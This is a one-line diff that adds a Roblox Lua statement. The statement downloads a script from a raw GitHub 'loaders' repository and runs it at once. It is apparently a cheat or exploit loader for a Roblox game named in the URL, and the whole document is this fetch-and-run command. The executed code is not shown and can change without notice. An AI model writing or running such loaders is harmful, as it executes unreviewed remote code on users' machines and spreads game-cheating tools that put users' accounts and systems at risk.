@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/get-your-driver-s-license-spam7-533kks5zhhla2m.lua"))()
